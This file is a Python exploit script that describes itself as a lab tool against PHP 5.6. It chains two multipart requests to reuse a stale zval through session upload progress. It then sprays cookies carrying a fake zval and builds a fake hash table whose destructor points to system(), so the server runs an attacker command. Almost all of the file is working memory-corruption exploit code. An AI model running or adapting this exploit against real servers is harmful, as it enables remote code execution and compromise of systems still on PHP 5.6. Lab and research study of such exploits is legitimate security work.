#!/usr/bin/env python3
"""Two-request ZE2 stale-zval carrier for the isolated PHP 5.6 lab."""

from __future__ import annotations

import argparse
import socket
import struct
import time


HOST = "php2shell-56-target"
ENDPOINT = "/index.php"
COMMAND = b"id>/out/p"


def multipart(parts: list[dict[str, bytes]], boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + part["name"] + b'"'
        if b"filename" in part:
            out += b'; filename="' + part[b"filename"] + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + part["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def post(body: bytes, boundary: bytes, extra_headers: bytes = b"") -> bytes:
    header = (
        f"POST {ENDPOINT} HTTP/1.1\r\nHost: {HOST}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
    ).encode() + extra_headers + b"Connection: close\r\n\r\n"
    with socket.create_connection((HOST, 80), 10) as sock:
        sock.settimeout(60)
        try:
            sock.sendall(header)
            for offset in range(0, len(body), 262144):
                sock.sendall(body[offset : offset + 262144])
        except OSError:
            return b""
        chunks: list[bytes] = []
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except OSError:
            pass
        return b"".join(chunks)


def status(response: bytes) -> bytes:
    return response.partition(b"\r\n")[0]


def producer(pads: int) -> bytes:
    parts: list[dict[str, bytes]] = [
        {"name": b"PHPSESSID", "data": b"a" * 19},
        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for index in range(pads):
        parts.append({"name": f"p{index:06d}"[:7].encode(), "data": b"V" * 7})
    parts += [
        {"name": b"f", b"filename": b"a.txt", "data": b"A" * 64},
        {"name": b"big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    boundary = b"S" * 17
    return post(multipart(parts, boundary), boundary)


def quote_cookie(data: bytes) -> tuple[bytes, int]:
    """Percent-quote bytes that would terminate or split an HTTP Cookie."""
    out = bytearray()
    quoted = 0
    for value in data:
        if value < 0x20 or value == 0x7F or value in b"%;,=":
            out += f"%{value:02X}".encode()
            quoted += 1
        else:
            out.append(value)
    return bytes(out), quoted * 2


def fake_zval_encoded(fake_ht: int | None) -> tuple[bytes, int]:
    if fake_ht is None:
        # Harmless scalar: refcount=1, IS_NULL.  This preserves the reclaim
        # geometry while allowing the calibration request to complete.
        decoded = b"A" * 8 + b"B" * 8 + struct.pack("<IBB", 1, 0, 0) + b"\x00" * 9
    else:
        decoded = (
            struct.pack("<Q", fake_ht)
            + b"B" * 8
            + struct.pack("<IBB", 1, 4, 0)
            # zval padding (+0x16) and the adjacent zval_gc_info.buffered
            # field (+0x18) must be NULL.  Otherwise _zval_ptr_dtor enters
            # gc_remove_zval_from_buffer before reaching zval_dtor.
            + b"\x00" * 9
        )
    if len(decoded) != 31:
        raise AssertionError(len(decoded))
    return quote_cookie(decoded)


def cookie_header(count: int, target: int, fake_ht: int | None) -> bytes:
    encoded, expansion = fake_zval_encoded(fake_ht)
    reductions: dict[int, int] = {}
    remaining = expansion
    for index in range(count - 1, target, -1):
        take = min(30, remaining)
        reductions[index] = take
        remaining -= take
        if not remaining:
            break
    if remaining:
        raise ValueError(f"cookie encoding expansion too large: {expansion}")
    pairs: list[bytes] = []
    for index in range(count):
        name = f"c{index:03d}".encode().ljust(31, b"n")
        if index == target:
            value = encoded
        elif index in reductions:
            value_len = 31 - reductions[index]
            value = f"v{index:03d}".encode().ljust(value_len, b"J")[:value_len]
        else:
            value = f"v{index:03d}".encode().ljust(31, b"K")
        pairs.append(name + b"=" + value)
    return b"Cookie: " + b"; ".join(pairs) + b"\r\n"


def fake_carrier(address: int | None, system: int | None, length: int) -> bytes:
    if address is None or system is None:
        return b"H56MARK" + b"M" * (length - 7)
    if length < 0xC0:
        raise ValueError("carrier is too short")
    ht = address + 0x20
    bucket = ht + 0x48
    command = address + 0xB0
    out = bytearray(b"H56MARK" + b"M" * (length - 7))
    struct.pack_into("<III", out, 0x20, 0, 0, 1)
    struct.pack_into("<Q", out, 0x20 + 0x10, 0)  # nNextFreeElement
    struct.pack_into("<Q", out, 0x20 + 0x18, bucket)  # pInternalPointer
    struct.pack_into("<Q", out, 0x20 + 0x20, bucket)  # pListHead
    struct.pack_into("<Q", out, 0x20 + 0x28, bucket)  # pListTail
    struct.pack_into("<Q", out, 0x20 + 0x30, 0)  # arBuckets
    struct.pack_into("<Q", out, 0x20 + 0x38, system)  # pDestructor
    out[0x20 + 0x40 : 0x20 + 0x48] = b"\x00" * 8
    struct.pack_into("<Q", out, 0x68 + 0x00, 0)  # h
    struct.pack_into("<I", out, 0x68 + 0x08, 0)  # nKeyLength
    struct.pack_into("<Q", out, 0x68 + 0x10, command)  # pData
    struct.pack_into("<Q", out, 0x68 + 0x18, 0)  # pDataPtr
    struct.pack_into("<Q", out, 0x68 + 0x20, 0)  # pListNext
    struct.pack_into("<Q", out, 0x68 + 0x28, 0)  # pListLast
    struct.pack_into("<Q", out, 0x68 + 0x30, 0)  # pNext
    struct.pack_into("<Q", out, 0x68 + 0x38, 0)  # pLast
    struct.pack_into("<Q", out, 0x68 + 0x40, 0)  # arKey
    out[0xB0 : 0xB0 + len(COMMAND) + 1] = COMMAND + b"\x00"
    return bytes(out)


def consumer(
    cookie_count: int,
    target_index: int,
    carrier_address: int | None,
    system: int | None,
    carrier_len: int,
) -> bytes:
    boundary = b"B" * 10
    fake_ht = None if carrier_address is None else carrier_address + 0x20
    parts = [
        {"name": b"PHPSESSID", "data": b"attacksessionid0001attacksessi"},
        {"name": b"carrier", "data": fake_carrier(carrier_address, system, carrier_len)},
        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwnpwnpwnpwnpwnpwnpwnpwnpwnp"},
    ]
    return post(
        multipart(parts, boundary),
        boundary,
        cookie_header(cookie_count, target_index, fake_ht),
    )


def main() -> int:
    global ENDPOINT
    parser = argparse.ArgumentParser()
    parser.add_argument("--phase", choices=("producer", "consumer", "both"), default="both")
    parser.add_argument("--pads", type=int, default=32)
    parser.add_argument("--cookie-count", type=int, default=40)
    parser.add_argument("--target-index", type=int, default=27)
    parser.add_argument("--carrier-address", type=lambda value: int(value, 0))
    parser.add_argument("--system", type=lambda value: int(value, 0))
    parser.add_argument("--carrier-len", type=int, default=224)
    parser.add_argument("--delay", type=float, default=0.25)
    parser.add_argument("--endpoint", default=ENDPOINT)
    args = parser.parse_args()
    ENDPOINT = args.endpoint
    if (args.carrier_address is None) != (args.system is None):
        raise SystemExit("--carrier-address and --system must be supplied together")
    if args.phase in ("producer", "both"):
        first = producer(args.pads)
        print("A", status(first), len(first), flush=True)
    if args.phase == "both":
        time.sleep(args.delay)
    if args.phase in ("consumer", "both"):
        second = consumer(
            args.cookie_count,
            args.target_index,
            args.carrier_address,
            args.system,
            args.carrier_len,
        )
        print("B", status(second), len(second), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
